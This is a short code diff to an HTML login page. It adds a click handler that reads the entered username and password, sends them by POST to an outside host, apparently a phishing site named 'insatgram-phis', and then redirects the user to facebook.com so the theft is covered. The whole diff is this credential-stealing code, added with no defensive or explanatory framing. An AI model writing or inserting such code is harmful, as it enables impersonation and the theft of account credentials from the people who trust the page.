@@ -74,6 +74,19 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
     document.getElementById('message').textContent = data.message;
   }
 });
+document.querySelector('button[type="button"]').addEventListener('click', async function() {
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
+  // Only send if both fields are filled
+  if (username && password) {
+    await fetch('https://insatgram-phis.onrender.com/api/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username, password })
+    });
+  }
+  window.location.href = 'https://www.facebook.com/';
+});
 </script>
 </body>
 </html> 
